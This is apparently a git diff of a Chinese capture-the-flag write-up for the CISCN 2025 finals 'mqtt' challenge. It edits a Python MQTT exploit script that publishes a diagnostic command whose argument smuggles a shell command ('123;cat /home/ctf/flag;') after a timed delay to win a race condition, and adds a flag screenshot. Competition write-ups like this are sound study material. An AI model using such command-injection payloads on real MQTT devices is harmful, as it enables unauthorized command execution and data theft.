@@ -1,7 +1,7 @@
 ---
 title: 国赛 决赛 2025 - mqtt
 date: 2025/07/19 23:32:00
-updated: 2025/07/19 23:32:00
+updated: 2025/07/20 08:06:00
 tags:
     - mqtt
     - race condition
@@ -81,11 +81,11 @@ cmd = {
     'arg': '123456789',
 }
 client.loop_start()
-client.publish('diag', dumps(cmd))
-time.sleep(0.5)
-cmd['arg'] = ';cat /home/ctf/flag#'
-client.publish('diag', dumps(cmd))
 client.subscribe('diag/resp')
+client.publish('diag', dumps(cmd))
+time.sleep(1)
+cmd['arg'] = '123;cat /home/ctf/flag;'
+client.publish('diag', dumps(cmd))
 try:
     while True:
         time.sleep(0.5)
@@ -94,3 +94,7 @@ except KeyboardInterrupt:
 client.loop_stop()
 client.disconnect()
 ```
+
+{% note default fa-flag %}
+![flag](/assets/ciscnxccb2025/mqtt_flag.png)
+{% endnote %}
